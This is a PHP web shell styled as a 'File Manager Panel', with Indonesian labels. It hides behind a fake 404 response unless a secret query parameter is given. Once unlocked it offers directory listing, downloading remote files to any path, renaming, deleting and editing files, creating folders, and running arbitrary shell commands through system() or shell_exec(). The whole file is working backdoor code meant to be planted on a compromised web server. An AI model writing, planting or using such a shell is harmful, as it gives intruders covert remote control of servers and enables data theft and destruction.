<?php
// Proteksi akses via query
if (!isset($_GET['nyenye']) || $_GET['nyenye'] !== 'ssi') {
    header("HTTP/1.0 404 Not Found");
    echo "<h1>404 Not Found</h1>";
    exit;
}

// CSS dan HTML Awal
echo '
<!DOCTYPE html>
<html>
<head>
    <title>File Manager Panel</title>
    <style>
        body {
            background-color: #1e1e2f;
            color: #f1f1f1;
            font-family: Consolas, monospace;
            margin: 0;
            padding: 0;
        }
        header {
            background: #27293d;
            padding: 20px;
            text-align: center;
            border-bottom: 2px solid #444;
        }
        header img {
            height: 80px;
        }
        .container {
            padding: 20px;
        }
        h2, h3 {
            color: #66ffcc;
            border-left: 5px solid #66ffcc;
            padding-left: 10px;
        }
        form {
            margin-bottom: 20px;
            background: #2b2d42;
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 0 5px #000;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 8px;
            border: none;
            border-radius: 5px;
            margin: 5px 0 10px 0;
            background: #1a1b2e;
            color: #fff;
        }
        input[type="submit"] {
            background: #66ffcc;
            color: #000;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background: #33ffaa;
        }
        pre {
            background: #111;
            padding: 10px;
            border-radius: 5px;
            overflow: auto;
        }
        hr {
            border-color: #444;
            margin: 40px 0;
        }
        footer {
            text-align: center;
            color: #777;
            font-size: 12px;
            margin: 30px 0;
        }
    </style>
</head>
<body>
<header>
    <img src="https://nyenyeits.me/images/sq.png" alt="Logo">
    <h2>🛠 File Manager Panel</h2>
</header>
<div class="container">
';

// ================================
// Semua script fitur dimulai di sini
$dir = $_GET['dir'] ?? getcwd();
if (empty($dir)) $dir = getcwd();

// Directory listing
echo "<h3>📁 Cek Isi Directory</h3>";
if (is_dir($dir) && is_readable($dir)) {
    echo "<p><strong>Directory:</strong> " . htmlspecialchars($dir) . "</p><pre>";
    foreach (scandir($dir) as $file) echo $file . "\n";
    echo "</pre>";
} else {
    echo "<p style='color:red;'>❌ Tidak bisa mengakses direktori.</p>";
}
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Path:</label>
    <input type="text" name="dir" value="' . htmlspecialchars($dir) . '">
    <input type="submit" value="Cek">
</form><hr>';

// Download file
$url = $_GET['url'] ?? '';
$save_to = $_GET['save_to'] ?? '';
echo "<h3>🌐 Download File dari URL</h3>";
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>URL:</label>
    <input type="text" name="url" value="' . htmlspecialchars($url) . '">
    <label>Simpan sebagai:</label>
    <input type="text" name="save_to" value="' . htmlspecialchars($save_to) . '">
    <input type="submit" value="Download">
</form>';
if ($url && $save_to) {
    $data = @file_get_contents($url);
    if ($data !== false && @file_put_contents($save_to, $data)) {
        echo "<pre>✅ File disimpan ke: $save_to</pre>";
    } else {
        echo "<pre>❌ Gagal download atau simpan file.</pre>";
    }
}
echo "<hr>";

// Rename file
$old_name = $_GET['old_name'] ?? '';
$new_name = $_GET['new_name'] ?? '';
echo "<h3>✏️ Rename File</h3>";
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Nama lama:</label>
    <input type="text" name="old_name" value="' . htmlspecialchars($old_name) . '">
    <label>Nama baru:</label>
    <input type="text" name="new_name" value="' . htmlspecialchars($new_name) . '">
    <input type="submit" value="Rename">
</form>';
if ($old_name && $new_name) {
    if (file_exists($old_name) && @rename($old_name, $new_name)) {
        echo "<pre>✅ Berhasil rename ke: $new_name</pre>";
    } else {
        echo "<pre>❌ Gagal rename.</pre>";
    }
}
echo "<hr>";

// Hapus file
$delete_file = $_GET['delete_file'] ?? '';
echo "<h3>🗑️ Hapus File</h3>";
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Path file:</label>
    <input type="text" name="delete_file" value="' . htmlspecialchars($delete_file) . '">
    <input type="submit" value="Hapus">
</form>';
if ($delete_file) {
    if (file_exists($delete_file) && @unlink($delete_file)) {
        echo "<pre>✅ File berhasil dihapus.</pre>";
    } else {
        echo "<pre>❌ Gagal hapus file.</pre>";
    }
}
echo "<hr>";

// Buat direktori
$new_dir = $_GET['new_dir'] ?? '';
echo "<h3>📂 Buat Folder</h3>";
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Nama Folder:</label>
    <input type="text" name="new_dir" value="' . htmlspecialchars($new_dir) . '">
    <input type="submit" value="Buat">
</form>';
if ($new_dir) {
    if (file_exists($new_dir)) {
        echo "<pre>⚠️ Direktori sudah ada.</pre>";
    } elseif (@mkdir($new_dir, 0755, true)) {
        echo "<pre>✅ Direktori berhasil dibuat.</pre>";
    } else {
        echo "<pre>❌ Gagal membuat direktori.</pre>";
    }
}
echo "<hr>";

// Edit file
$edit_file = $_GET['edit_file'] ?? '';
if ($_POST['edit_submit'] === 'Simpan' && $_POST['edit_file']) {
    $edited = file_put_contents($_POST['edit_file'], $_POST['file_content']);
    echo $edited !== false ? "<pre>✅ File disimpan.</pre>" : "<pre>❌ Gagal simpan.</pre>";
}
echo "<h3>📝 Edit File</h3>";
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Path file:</label>
    <input type="text" name="edit_file" value="' . htmlspecialchars($edit_file) . '">
    <input type="submit" value="Edit">
</form>';
if ($edit_file && file_exists($edit_file)) {
    $isi = file_get_contents($edit_file);
    echo '
    <form method="post">
        <input type="hidden" name="edit_file" value="' . htmlspecialchars($edit_file) . '">
        <textarea name="file_content" rows="15">' . htmlspecialchars($isi) . '</textarea><br>
        <input type="submit" name="edit_submit" value="Simpan">
    </form>';
}
echo "<hr>";

// Jalankan perintah shell
$cmd = $_GET['cmd'] ?? '';
echo "<h3>💻 Jalankan Shell Command</h3>";
echo '
<form method="get">
    <input type="hidden" name="nyenye" value="ssi">
    <label>Command:</label>
    <input type="text" name="cmd" value="' . htmlspecialchars($cmd) . '">
    <input type="submit" value="Run">
</form>';
if ($cmd) {
    echo "<pre>";
    if (function_exists("system")) system($cmd);
    elseif (function_exists("shell_exec")) echo shell_exec($cmd);
    else echo "❌ Shell exec tidak tersedia.";
    echo "</pre>";
}

echo "</div><footer>&copy; " . date("Y") . " Panel Tools | Private Nyenyee</footer></body></html>";
?>
